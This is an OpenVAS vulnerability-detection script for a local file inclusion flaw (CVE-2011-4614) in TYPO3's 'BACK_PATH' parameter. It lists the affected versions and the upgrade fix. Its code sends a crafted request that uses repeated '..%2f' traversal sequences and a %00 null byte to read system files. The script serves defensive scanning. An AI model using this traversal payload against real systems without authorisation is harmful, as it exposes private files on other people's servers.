###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_typo3_back_path_lfi_vuln.nasl 11857 2018-10-12 08:25:16Z cfischer $
#
# TYPO3 'BACK_PATH' Parameter Local File Include Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:typo3:typo3";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902795");
  script_version("$Revision: 11857 $");
  script_cve_id("CVE-2011-4614");
  script_bugtraq_id(51090);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 10:25:16 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2012-02-22 13:46:49 +0530 (Wed, 22 Feb 2012)");
  script_name("TYPO3 'BACK_PATH' Parameter Local File Include Vulnerability");

  script_tag(name:"impact", value:"Successful exploitation could allow an attacker to obtain arbitrary local
files in the context of an affected site.");
  script_tag(name:"vuldetect", value:"Send a Crafted HTTP GET request and check whether it is able to get sensitive
information.");
  script_tag(name:"insight", value:"The flaw is due to an input passed to the 'BACK_PATH' parameter in
'typo3/sysext/workspaces/Classes/Controller/AbstractController.php' is not
properly verified before being used to include files.");
  script_tag(name:"solution", value:"Upgrade to TYPO3 version 4.5.9 or 4.6.2 or later.");
  script_tag(name:"summary", value:"This host is running TYPO3 and is prone to local file inclusion vulnerability.");
  script_tag(name:"affected", value:"TYPO3 version 4.5.x before 4.5.9, 4.6.x before 4.6.2 and development versions
of 4.7");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://secunia.com/advisories/47201");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/72959");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Web application abuses");
  script_dependencies("gb_typo3_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("TYPO3/installed");

  script_xref(name:"URL", value:"http://typo3.org/download/packages/");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");


if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

files = traversal_files();

foreach file (keys(files))
{
  url = string(dir, "/sysext/workspaces/Classes/Controller/" +
              "AbstractController.php?BACK_PATH=",
              crap(data:"..%2f",length:5*10), files[file], "%00");

  if(http_vuln_check(port:port, url:url, pattern:file))
  {
    security_message(port:port);
    exit(0);
  }
}

exit(99);
